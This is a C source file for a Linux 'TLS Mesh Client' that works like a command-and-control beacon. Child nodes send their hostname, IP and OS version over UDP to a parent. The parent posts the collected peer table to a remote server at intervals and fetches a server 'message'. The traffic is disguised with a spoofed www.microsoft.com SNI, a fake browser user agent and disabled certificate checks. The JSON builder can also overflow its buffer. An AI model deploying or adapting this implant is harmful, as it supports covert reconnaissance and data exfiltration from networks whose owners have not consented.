/*
 * TLS Mesh Client (Linux)
 * ========================
 *
 * Modes:
 *   PARENT: Connects to server via TLS, receives commands, listens for children via UDP
 *   CHILD:  Sends telemetry to parent via UDP (fire-and-forget)
 *   NORMAL: Basic TLS client for testing
 *
 * Compilation:
 *   gcc tls_client_linux.c -o tls_client -lssl -lcrypto -lpthread
 *
 * Usage:
 *   Parent: ./tls_client -i <server_ip> -p <port> -l <udp_port> [-t interval]
 *   Child:  ./tls_client -P <parent_ip:port> [-t interval]
 *   Normal: ./tls_client -i <server_ip> -p <port>
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

/* ============================================================================
 * CONFIGURATION
 * ============================================================================ */

#define MAX_PEERS 64
#define BUFFER_SIZE 4096

/* ============================================================================
 * PEER TABLE - Tracks all known nodes in the mesh
 * ============================================================================ */

typedef struct {
    char ip[16];
    char hostname[64];
    char os[64];
    long timestamp;
    int active;
} Peer;

Peer peer_table[MAX_PEERS];
int peer_count = 0;
pthread_mutex_t peer_mutex = PTHREAD_MUTEX_INITIALIZER;

/* Thread-safe peer table operations */
void peer_add(const char *ip, const char *hostname, const char *os, long ts) {
    pthread_mutex_lock(&peer_mutex);

    /* Update existing peer */
    for (int i = 0; i < peer_count; i++) {
        if (strcmp(peer_table[i].ip, ip) == 0) {
            if (hostname) strncpy(peer_table[i].hostname, hostname, 63);
            if (os) strncpy(peer_table[i].os, os, 63);
            peer_table[i].timestamp = ts;
            peer_table[i].active = 1;
            pthread_mutex_unlock(&peer_mutex);
            return;
        }
    }

    /* Add new peer */
    if (peer_count < MAX_PEERS) {
        strncpy(peer_table[peer_count].ip, ip, 15);
        peer_table[peer_count].ip[15] = '\0';
        strncpy(peer_table[peer_count].hostname, hostname ? hostname : "unknown", 63);
        peer_table[peer_count].hostname[63] = '\0';
        strncpy(peer_table[peer_count].os, os ? os : "unknown", 63);
        peer_table[peer_count].os[63] = '\0';
        peer_table[peer_count].timestamp = ts;
        peer_table[peer_count].active = 1;
        peer_count++;
    }

    pthread_mutex_unlock(&peer_mutex);
}

/* Build JSON payload with all peers */
int peer_build_json(char *buf, size_t len) {
    pthread_mutex_lock(&peer_mutex);

    int n = snprintf(buf, len, "{\"clients\":[");
    for (int i = 0; i < peer_count; i++) {
        if (i > 0) n += snprintf(buf + n, len - n, ",");
        n += snprintf(buf + n, len - n,
            "{\"ip\":\"%s\",\"hostname\":\"%s\",\"os\":\"%s\",\"timestamp\":%ld}",
            peer_table[i].ip, peer_table[i].hostname, peer_table[i].os,
            peer_table[i].timestamp);
    }
    n += snprintf(buf + n, len - n, "]}");

    pthread_mutex_unlock(&peer_mutex);
    return n;
}

void peer_print(void) {
    pthread_mutex_lock(&peer_mutex);
    printf("\n=== Peers (%d) ===\n", peer_count);
    for (int i = 0; i < peer_count; i++) {
        printf("  %s | %s | %s | %ld\n",
            peer_table[i].ip, peer_table[i].hostname,
            peer_table[i].os, peer_table[i].timestamp);
    }
    printf("==================\n");
    pthread_mutex_unlock(&peer_mutex);
}

/* ============================================================================
 * GLOBAL STATE
 * ============================================================================ */

int is_parent = 0;          /* Parent mode enabled */
int is_child = 0;           /* Child mode enabled */
int listen_port = 0;        /* UDP port for children (parent mode) */
char parent_ip[64] = "";    /* Parent IP (child mode) */
int parent_port = 0;        /* Parent port (child mode) */
int interval = 120;         /* Send interval in seconds */
volatile int running = 1;   /* Thread control flag */

/* ============================================================================
 * UDP LISTENER THREAD (Parent Mode)
 * Receives telemetry from child nodes
 * ============================================================================ */

void *udp_listener(void *arg) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(listen_port);

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        printf("[!] UDP bind failed on port %d\n", listen_port);
        close(sock);
        return NULL;
    }

    printf("[*] UDP listening on port %d\n", listen_port);

    char buf[1024];
    while (running) {
        struct sockaddr_in src;
        socklen_t srclen = sizeof(src);

        int n = recvfrom(sock, buf, sizeof(buf) - 1, 0, (struct sockaddr *)&src, &srclen);
        if (n <= 0) continue;
        buf[n] = '\0';

        /* Get sender IP */
        char ip[16];
        inet_ntop(AF_INET, &src.sin_addr, ip, sizeof(ip));

        /* Parse JSON fields */
        long ts = (long)time(NULL);
        char hostname[64] = "unknown";
        char os[64] = "unknown";

        char *p;
        if ((p = strstr(buf, "\"ts\":")) != NULL) ts = atol(p + 5);

        if ((p = strstr(buf, "\"hostname\":\"")) != NULL) {
            p += 12;
            char *end = strchr(p, '"');
            if (end) {
                size_t len = end - p;
                if (len > 63) len = 63;
                strncpy(hostname, p, len);
                hostname[len] = '\0';
            }
        }

        if ((p = strstr(buf, "\"os\":\"")) != NULL) {
            p += 6;
            char *end = strchr(p, '"');
            if (end) {
                size_t len = end - p;
                if (len > 63) len = 63;
                strncpy(os, p, len);
                os[len] = '\0';
            }
        }

        printf("[UDP] %s (%s, %s)\n", ip, hostname, os);
        peer_add(ip, hostname, os, ts);
        peer_print();
    }

    close(sock);
    return NULL;
}

/* ============================================================================
 * TLS CONFIGURATION
 * ============================================================================ */

SSL_CTX *create_tls_context(void) {
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();

    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) return NULL;

    /* TLS 1.2/1.3 with modern ciphers */
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION);
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);

    SSL_CTX_set_ciphersuites(ctx,
        "TLS_AES_128_GCM_SHA256:"
        "TLS_AES_256_GCM_SHA384:"
        "TLS_CHACHA20_POLY1305_SHA256");

    SSL_CTX_set_cipher_list(ctx,
        "ECDHE-RSA-AES128-GCM-SHA256:"
        "ECDHE-RSA-AES256-GCM-SHA384:"
        "ECDHE-RSA-CHACHA20-POLY1305");

    return ctx;
}

/* ============================================================================
 * MAIN
 * ============================================================================ */

void usage(const char *prog) {
    printf("TLS Mesh Client (Linux)\n\n");
    printf("Usage:\n");
    printf("  Parent: %s -i <ip> -p <port> -l <udp_port> [-t secs]\n", prog);
    printf("  Child:  %s -P <ip:port> [-t secs]\n", prog);
    printf("\nOptions:\n");
    printf("  -i, --ip        Server IP (required for parent)\n");
    printf("  -p, --port      Server port (required for parent)\n");
    printf("  -l, --listen    UDP port for children (enables parent mode)\n");
    printf("  -P, --parent    Parent address ip:port (enables child mode)\n");
    printf("  -t, --interval  Send interval in seconds (default: 120)\n");
    printf("  -h, --host      SNI hostname (default: www.microsoft.com)\n");
}

int main(int argc, char *argv[]) {
    const char *server_ip = NULL;
    int server_port = 0;
    const char *host = "www.microsoft.com";
    const char *ua = "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0";

    /* Parse arguments */
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-i") || !strcmp(argv[i], "--ip")) {
            server_ip = argv[++i];
        } else if (!strcmp(argv[i], "-p") || !strcmp(argv[i], "--port")) {
            server_port = atoi(argv[++i]);
        } else if (!strcmp(argv[i], "-l") || !strcmp(argv[i], "--listen")) {
            listen_port = atoi(argv[++i]);
            is_parent = 1;
        } else if (!strcmp(argv[i], "-P") || !strcmp(argv[i], "--parent")) {
            char *arg = argv[++i];
            char *colon = strchr(arg, ':');
            if (colon) {
                strncpy(parent_ip, arg, colon - arg);
                parent_port = atoi(colon + 1);
                is_child = 1;
            }
        } else if (!strcmp(argv[i], "-t") || !strcmp(argv[i], "--interval")) {
            interval = atoi(argv[++i]);
        } else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--host")) {
            host = argv[++i];
        } else if (!strcmp(argv[i], "--help")) {
            usage(argv[0]);
            return 0;
        }
    }

    /* Validate - must be either parent or child mode */
    if (!is_child && !is_parent) {
        printf("Error: Must specify either parent mode (-l) or child mode (-P)\n\n");
        usage(argv[0]);
        return 1;
    }

    if (is_parent && (!server_ip || !server_port)) {
        printf("Error: Parent mode requires -i and -p\n\n");
        usage(argv[0]);
        return 1;
    }

    /* ========================================================================
     * CHILD MODE: Send UDP telemetry to parent
     * ======================================================================== */
    if (is_child) {
        printf("[CHILD] Target: %s:%d, Interval: %ds\n\n", parent_ip, parent_port, interval);

        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        struct sockaddr_in dest = {0};
        dest.sin_family = AF_INET;
        dest.sin_port = htons(parent_port);
        inet_pton(AF_INET, parent_ip, &dest.sin_addr);

        /* Get our IP */
        int tmp = socket(AF_INET, SOCK_DGRAM, 0);
        connect(tmp, (struct sockaddr *)&dest, sizeof(dest));
        struct sockaddr_in local;
        socklen_t len = sizeof(local);
        getsockname(tmp, (struct sockaddr *)&local, &len);
        char my_ip[16];
        inet_ntop(AF_INET, &local.sin_addr, my_ip, sizeof(my_ip));
        close(tmp);

        /* Get hostname */
        char hostname[256] = "unknown";
        gethostname(hostname, sizeof(hostname));

        /* Get OS version using uname */
        char os_info[128] = "Linux";
        struct utsname uts;
        if (uname(&uts) == 0) {
            snprintf(os_info, sizeof(os_info), "%s %s", uts.sysname, uts.release);
        }

        char buf[512];
        while (1) {
            snprintf(buf, sizeof(buf),
                "{\"ip\":\"%s\",\"hostname\":\"%s\",\"os\":\"%s\",\"ts\":%ld}",
                my_ip, hostname, os_info, (long)time(NULL));
            sendto(sock, buf, strlen(buf), 0, (struct sockaddr *)&dest, sizeof(dest));
            printf("[>] %s\n", buf);
            sleep(interval);
        }
    }

    /* ========================================================================
     * PARENT MODE: TLS to server + UDP from children
     * Each cycle: connect -> POST peers -> GET message -> disconnect
     * ======================================================================== */
    if (is_parent) {
        printf("[PARENT] Server: %s:%d, UDP: %d, Interval: %ds\n\n",
               server_ip, server_port, listen_port, interval);

        SSL_CTX *ctx = create_tls_context();

        pthread_t tid;
        pthread_create(&tid, NULL, udp_listener, NULL);

        struct sockaddr_in server = {0};
        server.sin_family = AF_INET;
        server.sin_port = htons(server_port);
        inet_pton(AF_INET, server_ip, &server.sin_addr);

        /* Get hostname and OS once at startup */
        char my_hostname[256] = "unknown";
        char my_os[128] = "Linux";
        gethostname(my_hostname, sizeof(my_hostname));
        struct utsname uts;
        if (uname(&uts) == 0) {
            snprintf(my_os, sizeof(my_os), "%s %s", uts.sysname, uts.release);
        }

        char req[BUFFER_SIZE], res[BUFFER_SIZE], body[2048];
        char my_ip[16] = "";

        while (1) {
            printf("\n--- Cycle ---\n");

            /* Connect */
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
                printf("[!] Connect failed\n");
                close(sock);
                sleep(interval);
                continue;
            }

            /* Get our IP and add to peers */
            struct sockaddr_in local;
            socklen_t len = sizeof(local);
            if (getsockname(sock, (struct sockaddr *)&local, &len) == 0) {
                inet_ntop(AF_INET, &local.sin_addr, my_ip, sizeof(my_ip));
                peer_add(my_ip, my_hostname, my_os, (long)time(NULL));
            }

            /* TLS handshake */
            SSL *ssl = SSL_new(ctx);
            SSL_set_tlsext_host_name(ssl, host);
            SSL_set_fd(ssl, sock);

            if (SSL_connect(ssl) <= 0) {
                printf("[!] TLS failed\n");
                SSL_free(ssl);
                close(sock);
                sleep(interval);
                continue;
            }
            printf("[+] TLS connected\n");

            /* POST peer table */
            peer_build_json(body, sizeof(body));
            snprintf(req, sizeof(req),
                "POST /api/v1/telemetry HTTP/1.1\r\n"
                "Host: %s\r\nUser-Agent: %s\r\n"
                "Content-Type: application/json\r\n"
                "Content-Length: %d\r\nConnection: keep-alive\r\n\r\n%s",
                host, ua, (int)strlen(body), body);

            SSL_write(ssl, req, strlen(req));
            printf("[>] POST %s\n", body);

            int n = SSL_read(ssl, res, sizeof(res) - 1);
            if (n > 0) {
                res[n] = '\0';
                char *end = strchr(res, '\r');
                if (end) *end = '\0';
                printf("[<] %s\n", res);
            }

            /* GET message */
            snprintf(req, sizeof(req),
                "GET /api/v1/message HTTP/1.1\r\n"
                "Host: %s\r\nUser-Agent: %s\r\n"
                "Accept: application/json\r\nConnection: close\r\n\r\n",
                host, ua);

            if (SSL_write(ssl, req, strlen(req)) <= 0) {
                printf("[!] GET write failed\n");
            } else {
                n = SSL_read(ssl, res, sizeof(res) - 1);
                if (n > 0) {
                    res[n] = '\0';
                    /* Extract message from JSON body */
                    char *body_start = strstr(res, "\r\n\r\n");
                    if (body_start) {
                        body_start += 4;
                        char *msg = strstr(body_start, "\"message\":\"");
                        if (msg) {
                            msg += 11;
                            char *msg_end = strchr(msg, '"');
                            if (msg_end) *msg_end = '\0';
                            printf("\n========================================\n");
                            printf("  SERVER MESSAGE: %s\n", msg);
                            printf("========================================\n");
                        } else {
                            printf("[!] No message field in: %s\n", body_start);
                        }
                    } else {
                        printf("[!] No body in GET response\n");
                    }
                } else {
                    printf("[!] GET read failed (n=%d)\n", n);
                }
            }

            /* Disconnect */
            SSL_shutdown(ssl);
            SSL_free(ssl);
            close(sock);
            printf("[-] Disconnected\n");

            peer_print();
            sleep(interval);
        }
    }

    return 0;
}
